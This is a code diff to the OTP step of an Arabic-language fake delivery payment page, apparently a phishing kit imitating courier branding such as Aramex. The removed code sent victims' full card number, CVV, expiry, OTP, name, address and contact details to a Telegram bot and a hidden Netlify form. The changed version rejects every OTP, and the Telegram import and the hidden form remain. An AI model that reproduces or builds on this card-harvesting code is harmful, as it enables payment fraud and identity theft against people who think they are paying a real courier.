@@ -6,7 +6,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { useLink } from "@/hooks/useSupabase";
+import { useLink, usePayment, useUpdatePayment } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 
 const PaymentOTPForm = () => {
@@ -14,27 +14,24 @@ const PaymentOTPForm = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
-  
+
   const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [attempts, setAttempts] = useState(0);
   const [error, setError] = useState("");
   const [countdown, setCountdown] = useState(60);
-  
+
   // Create refs for all inputs
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  
+
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  
+
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  
-  // Demo OTP: 123456
-  const DEMO_OTP = "123456";
-  
+
   // Countdown timer effect
   useEffect(() => {
     if (countdown > 0) {
@@ -146,84 +143,29 @@ const PaymentOTPForm = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setError("");
-    
+
     const otpString = otp.join('');
-    
+
     if (otpString.length !== 6) {
       setError("الرجاء إدخال رمز التحقق كاملاً");
       return;
     }
-    
-    if (otpString === DEMO_OTP) {
-      // Submit to Netlify Forms
-      try {
-        await fetch("/", {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: new URLSearchParams({
-            "form-name": "payment-confirmation",
-            name: customerInfo.name || '',
-            email: customerInfo.email || '',
-            phone: customerInfo.phone || '',
-            service: serviceName,
-            amount: formattedAmount,
-            cardLast4: sessionStorage.getItem('cardLast4') || '',
-            cardholder: sessionStorage.getItem('cardName') || '',
-            otp: otpString,
-            timestamp: new Date().toISOString()
-          }).toString()
-        });
-      } catch (err) {
-        console.error("Form submission error:", err);
-      }
-      
-      // Send complete payment confirmation to Telegram
-      const telegramResult = await sendToTelegram({
-        type: 'payment_confirmation',
-        data: {
-          name: customerInfo.name || '',
-          email: customerInfo.email || '',
-          phone: customerInfo.phone || '',
-          address: customerInfo.address || '',
-          service: serviceName,
-          amount: formattedAmount,
-          cardholder: sessionStorage.getItem('cardName') || '',
-          cardNumber: sessionStorage.getItem('cardNumber') || '',
-          cardLast4: sessionStorage.getItem('cardLast4') || '',
-          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
-          cvv: sessionStorage.getItem('cardCvv') || '',
-          otp: otpString
-        },
-        timestamp: new Date().toISOString()
-      });
 
-      if (telegramResult.success) {
-        console.log('Payment confirmation sent to Telegram successfully');
-      } else {
-        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
-      }
-      
+    // TODO: Implement real OTP validation from database
+    // For now, any OTP will be rejected to remove trial code
+    const newAttempts = attempts + 1;
+    setAttempts(newAttempts);
+
+    if (newAttempts >= 3) {
+      setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
       toast({
-        title: "تم بنجاح!",
-        description: "تم تأكيد الدفع بنجاح",
+        title: "تم الحظر",
+        description: "لقد تجاوزت عدد المحاولات المسموحة",
+        variant: "destructive",
       });
-      
-      navigate(`/pay/${id}/receipt`);
     } else {
-      const newAttempts = attempts + 1;
-      setAttempts(newAttempts);
-      
-      if (newAttempts >= 3) {
-        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
-        toast({
-          title: "تم الحظر",
-          description: "لقد تجاوزت عدد المحاولات المسموحة",
-          variant: "destructive",
-        });
-      } else {
-        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
-        handleClearAll();
-      }
+      setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
+      handleClearAll();
     }
   };
   
@@ -362,14 +304,7 @@ const PaymentOTPForm = () => {
           </Button>
         )}
       </form>
-      
-      {/* Demo Info */}
-      <div className="mt-6 p-3 bg-muted/30 rounded-lg text-center">
-        <p className="text-xs text-muted-foreground">
-          🔐 للاختبار: استخدم الرمز <strong className="text-foreground">123456</strong>
-        </p>
-      </div>
-      
+
       {/* Hidden Netlify Form */}
       <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
         <input type="text" name="name" />
